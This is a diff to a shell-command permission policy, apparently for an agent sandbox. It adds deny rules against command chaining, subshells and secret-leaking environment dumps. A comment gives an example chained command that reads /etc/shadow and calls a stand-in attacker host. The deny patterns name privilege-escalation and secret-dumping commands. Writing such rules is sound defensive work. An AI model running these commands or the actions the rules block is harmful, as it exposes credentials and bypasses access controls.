@@ -66,6 +66,21 @@ rules:
     when:
       command: "^(sudo|su|doas|pkexec)\\b"
 
+  # Deny shell chaining / subshell execution — prevents ACL bypass.
+  # MUST precede shell allow rules so that chained commands like
+  # ``cat /etc/shadow ; curl http://evil.com`` are blocked before the
+  # ``cat`` allow rule can match.
+  - kind: shell
+    action: deny
+    when:
+      command: "(;|&&|\\|\\||\\|\\s|\\$\\(|`|\\bsh\\s+-c\\b|\\bbash\\s+-c\\b)"
+
+  # Deny environment inspection commands that leak secrets
+  - kind: shell
+    action: deny
+    when:
+      command: "^(env|printenv|set|export\\s+-p)\\b"
+
   # Allow read-only inspection commands
   - kind: shell
     action: allow
@@ -96,11 +111,11 @@ rules:
     when:
       command: "^(pytest|python3?\\s+-m pytest|uv run.*pytest)\\b"
 
-  # Allow safe environment inspection
+  # Allow safe system inspection (no secret exposure)
   - kind: shell
     action: allow
     when:
-      command: "^(env|printenv|set|export -p|whoami|id|pwd|hostname|uname|date|uptime)\\b"
+      command: "^(whoami|id|pwd|hostname|uname|date|uptime)\\b"
 
   # ===========================================================================
   # READ  (kind: read)
